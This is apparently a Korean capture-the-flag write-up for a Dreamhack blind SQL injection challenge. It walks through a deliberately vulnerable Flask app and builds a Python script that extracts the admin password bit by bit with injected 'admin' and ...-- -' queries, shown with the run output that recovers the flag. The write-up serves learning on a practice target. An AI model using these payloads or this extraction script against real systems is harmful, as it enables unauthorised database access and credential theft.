https://honey-push-30b.notion.site/Blind-SQL-Injection-Advanced-4b26eb5d05cf4a07925d032aa5f127a8
# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/83404ea5-ae36-404e-bd3b-7eccc36705a1/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

문제 파일을 다운로드 받으면 app.py와 init.sql, requirements.txt가 있다. 아래는 app.py의 코드이다.

```python
import os
from flask import Flask, request, render_template_string
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'user_db')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM users WHERE uid='{{uid}}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
{% if nrows == 1%}
    <pre style="font-size:150%">user "{{uid}}" exists.</pre>
{% endif %}
'''

@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '')
    nrows = 0

    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")

    return render_template_string(template, uid=uid, nrows=nrows)

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

# 코드 분석

```python
app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'user_db')
mysql = MySQL(app)
```

MYSQL 데이터베이스에 로컬호스트로 접속하여 user_db에 알아서 password까지 입력하여 접근해준다. 

```python
template ='''
<pre style="font-size:200%">SELECT * FROM users WHERE uid='{{uid}}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
{% if nrows == 1%}
    <pre style="font-size:150%">user "{{uid}}" exists.</pre>
{% endif %}
'''
```

접속하면 나오는 템플릿인데 여기서 주의해야 할점은 nrows가 1이어야만 user {uid} exists. 가 출력된다는 점이다. 따라서 SQL Query의 결과 행이 1로 되어야한다.

 

```python
@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '')
    nrows = 0

    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")

    return render_template_string(template, uid=uid, nrows=nrows)
```

uid 값을 입력받아서 SQL Query인 “SELECT * FROM users Where uid=’입력값’;” 을 실행시킨다. 

그리고 init.sql 을 살펴보면 테이블의 구조를 알 수 있다.

```python
CREATE DATABASE user_db CHARACTER SET utf8;
GRANT ALL PRIVILEGES ON user_db.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `user_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO users (uid, upw) values ('admin', 'DH{**FLAG**}');
INSERT INTO users (uid, upw) values ('guest', 'guest');
INSERT INTO users (uid, upw) values ('test', 'test');
FLUSH PRIVILEGES;
```

user_db의 캐릭터를 utf8로 인코딩하고 있음을 확인할 수 있다.

테이블의 구조를 보면 

테이블의 이름 : users

테이블에 있는 컬럼 : idx, uid, upw

idx는 저절로 생성되는 auto_increment 인덱스값이고 uid는 id 를 의미하는 128바이트값, upw는 password를 의미하는 128바이트 값이다.

그리고 이 테이블에 저장된 uid,upw 값을 보면 (admin, flag),(guest,guest),(test,test)가 있다. 즉 우리가 실행할 SQL Query는 “SELECT * FROM users Where uid=’입력값’;” 이므로 uid가 admin인 값을 가져오고 flag값을 알아내면 된다.

# 문제 접근

먼저 글자수를 알아야한다.

글자수를 알기 위해서 MSSQL에서는 length함수가 존재하지만 length함수는 바이트로 변환한 결과값을 반환하기때문에 아스키코드로(1바이트)만 되어있지 않다면 정확한 바이트 수가 아닌 다른 값이 나올 수 있다. 문제에서 다음과 같은 힌트를 줬다.

**관리자의 비밀번호는 "아스키코드"와 "한글"로 구성되어 있습니다.**

한글의 경우 아스키코드와 다르게 인코딩 값에 따라서 바이트로 변환했을 때 바이트가 달라진다. utf8로 인코딩하고 있으므로 UTF-8을 기준으로 하면 UTF -8 의 경우는 한글이 3바이트로 표현된다. 따라서 바이트로 변환한 길이 값을 리턴하는 length함수가 아닌 char_length함수로 패스워드의 길이를 알아내야한다.

“SELECT * FROM users Where uid=’admin’ and char_length(upw) = {password_length} -- -” 쿼리를 이용해서 패스워드의 길이를 알아낼 수 있다.

## 주석 처리 시 -- 가 아닌 -- -를 써주는 이유

주석 처리를 할 때 한줄 주석 시에 -- 뒤에 값이 존재해야지만 주석 처리가 정상적으로 이루어진다. 따라서 -- 뒤에 -가 아닌 다른 값 a나 b 나 1같은 값들을 넣어주어도 정상적으로 주석 처리가 된다.

![주석처리.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6c13c77a-26cf-4888-97fd-177b2bdea956/%EC%A3%BC%EC%84%9D%EC%B2%98%EB%A6%AC.png)

주석을 넣어줄 때 -- -가 아닌 -- 1로 넣어주어도 정상적으로 주석처리가 되어 SQL Injection이 이루어진 모습이다.

```python
import requests

password_len=0
host="http://host3.dreamhack.games:19347"

while True:
    password_len+=1
    query=f"admin' and char_length(upw) = {password_len}-- -"
    url=f'{host}/?uid={query}'
    response=requests.get(url)
  
    if "exists" in response.text :
        break
    print(password_len)
# 패스워드 길이 알아냄.
```

이제 패스워드의 길이를 알아냈으므로 각 글자를 비트로 변환했을 때 비트의 길이 수를 알아내야 한다. 각 바이트값을 알아내지 않고 비트로 하는 이유는 한글의 경우 utf-8이면 3바이트이기 때문에 2의 24승까지 브루트포스로 알아내는 것보다 24번의 비트 알아내는 과정을 통해 알아내는 것이 더 빠르기 때문이다.

```python
import requests

password_len=0
host="http://host3.dreamhack.games:19347"

while True:
    password_len+=1
    query=f"admin' and char_length(upw) = {password_len}-- -"
    url=f'{host}/?uid={query}'
    response=requests.get(url)
  
    if "exists" in response.text :
        break
    print(password_len)
# 패스워드 길이 알아냄.

flag=""
for i in range(1,password_len+1):
    bit_len=0
    while True:
        bit_len+=1
        query= f"admin' and length(bin(ord(substr(upw,{i},1))))={bit_len}-- -"
        url=f'{host}/?uid={query}'
        response=requests.get(url)
        if "exists" in response.text :
            break
    print(bit_len)
    # 비트 길이 알아냈음.
```

이제 비트 길이를 알아냈으므로 패스워드의 i번째 글자의 각 비트를 알아낼 수 있다. i번째 글자의 각 비트는 1아니면 0이므로 i번째 글자의 각 비트가 1인지 검사해서 비트를 알아낸다.

```python
import requests

password_len=0
host="http://host3.dreamhack.games:19347"

while True:
    password_len+=1
    query=f"admin' and char_length(upw) = {password_len}-- -"
    url=f'{host}/?uid={query}'
    response=requests.get(url)
  
    if "exists" in response.text :
        break
    print(password_len)
# 패스워드 길이 알아냄.

flag=""
for i in range(1,password_len+1):
    bit_len=0
    while True:
        bit_len+=1
        query= f"admin' and length(bin(ord(substr(upw,{i},1))))={bit_len}-- -"
        url=f'{host}/?uid={query}'
        response=requests.get(url)
        if "exists" in response.text :
            break
    print(bit_len)
    # 비트 길이 알아냈음.
    bits=""
    for j in range(1,bit_len+1):
        query=f"admin' and substr(bin(ord(substr(upw,{i},1))),{j},1)='1'-- -"
        url=f'{host}/?uid={query}'
        response=requests.get(url)
        if "exists" in response.text :
            bits=bits+"1"
        else:
            bits=bits+"0"
    print(bits)
    #비트 알아냈음.
```

그럼 이제 이 비트의 길이가 8비트 이내면 1바이트인 아스키코드이고 24비트 이내면 3바이트인 한글이다. 그러므로 비트의 길이에 따라서 이 비트 문자열을 int(bit,2)를 통해 2진수로 인식 시켜 int.to_bytes함수를 이용하여 바이트로 바꾼뒤 utf-8로 디코딩 해준다.

int.to_bytes( 바꿀 int, 바이트 수, byteorder=”big” or “little”)

```python
import requests

password_len=0
host="http://host3.dreamhack.games:19347"

while True:
    password_len+=1
    query=f"admin' and char_length(upw) = {password_len}-- -"
    url=f'{host}/?uid={query}'
    response=requests.get(url)
  
    if "exists" in response.text :
        break
    print(password_len)
# 패스워드 길이 알아냄.

flag=""
for i in range(1,password_len+1):
    bit_len=0
    while True:
        bit_len+=1
        query= f"admin' and length(bin(ord(substr(upw,{i},1))))={bit_len}-- -"
        url=f'{host}/?uid={query}'
        response=requests.get(url)
        if "exists" in response.text :
            break
    print(bit_len)
    # 비트 길이 알아냈음.
    bits=""
    for j in range(1,bit_len+1):
        query=f"admin' and substr(bin(ord(substr(upw,{i},1))),{j},1)='1'-- -"
        url=f'{host}/?uid={query}'
        response=requests.get(url)
        if "exists" in response.text :
            bits=bits+"1"
        else:
            bits=bits+"0"
    print(bits)
    #비트 알아냈음.
    if bit_len <=8: # 아스키코드
        flag+=int.to_bytes(int(bits,2),1,byteorder="big").decode("utf-8")
    elif bit_len >16 and bit_len <=24: #한글
        flag+=int.to_bytes(int(bits,2),3,byteorder="big").decode("utf-8")

    print(flag)
print(flag)
```

 이제 이 코드를 실행하면 flag 값을 얻을 수 있다.

```python
7
1000100
D
7
1001000
DH
7
1111011
DH{
24
111011001001110110110100
DH{이
24
111010101011001010000011
DH{이것
24
111011001001110110110100
DH{이것이
24
111010111011100110000100
DH{이것이비
24
111010111011000010000000
DH{이것이비밀
24
111010111011001010001000
DH{이것이비밀번
24
111011011001100010111000
DH{이것이비밀번호
6
100001
DH{이것이비밀번호!
6
111111
DH{이것이비밀번호!?
7
1111101
DH{이것이비밀번호!?}
```

flag값인 `DH{이것이비밀번호!?}` 를 얻어낼 수 있다.
